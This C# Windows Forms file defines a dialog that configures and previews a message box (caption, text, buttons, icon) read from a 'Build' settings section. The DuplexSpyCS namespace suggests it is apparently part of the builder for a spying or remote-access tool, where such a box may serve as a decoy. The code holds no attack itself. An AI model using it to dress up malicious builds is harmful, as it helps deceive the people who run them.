using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmBuildMsgbox : Form
    {
        public MsgBoxConfig config;
        private clsIniManager ini_manager = clsStore.ini_manager;

        public frmBuildMsgbox()
        {
            InitializeComponent();
        }

        void setup()
        {
            textBox1.Text = ini_manager.Read("Build", "msgbox_caption");
            textBox2.Text = ini_manager.Read("Build", "msgbox_text");

            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }

        private void frmBuildMsgbox_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Icon icon = null;
            switch ((MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), comboBox1.Text))
            {
                case MessageBoxIcon.Information:
                    icon = SystemIcons.Information;
                    break;
                case MessageBoxIcon.Warning | MessageBoxIcon.Exclamation:
                    icon = SystemIcons.Warning;
                    break;
                case MessageBoxIcon.Error | MessageBoxIcon.Hand | MessageBoxIcon.Stop:
                    icon = SystemIcons.Error;
                    break;
                case MessageBoxIcon.Question:
                    icon = SystemIcons.Question;
                    break;
            }

            pictureBox1.Image = icon == null ? null : icon.ToBitmap();
        }

        //TEST
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                MessageBox.Show(
                    textBox2.Text, //CONTEXT
                    textBox1.Text, //CAPTION
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), comboBox2.Text, true), //BUTTON
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), comboBox1.Text, true) //ICON
                );
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //APPLY
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                config = new MsgBoxConfig();
                config.context = textBox2.Text;
                config.caption = textBox1.Text;
                config.button = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), comboBox2.Text, true); //BUTTON
                config.icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), comboBox1.Text, true); //ICON

                ActiveForm.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
